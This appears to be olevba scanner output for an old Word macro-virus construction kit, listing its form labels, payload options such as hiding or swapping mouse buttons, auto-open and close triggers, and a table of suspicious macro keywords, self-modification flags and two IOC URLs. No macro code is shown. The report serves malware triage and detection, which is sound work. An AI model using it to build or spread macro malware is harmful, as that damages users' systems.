VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%��6�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QEQ'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jackie twoflower is proud member of:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create Class
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ph33r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Document CloseK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Document Open�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Options...^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i24/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Settings...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i24/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�About CMK�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�About author
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Greets@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i40/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Trigger
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hide the mouse cursorram
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Swap the mouse buttonsam
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Make the mouse cursor go wild
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nail the mouse cursorsam
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
No payloadL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PiE developed by jackie twoflowertonS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Standard
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Standard
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Large
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Small
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmStart/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Start...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmStart/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image3'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'SpinButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'SpinButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtTage'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtMonate'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label22'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame4'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame5'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton8'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame6'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmMain/i40'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPayload/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton2'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton3'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton4'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton5'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptionButton6'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmPiE/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmStart'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.coderz.ne|URL                                          |
|          |t/metaphase/        |                                             |
|IOC       |http://beam.to/lzo  |URL                                          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

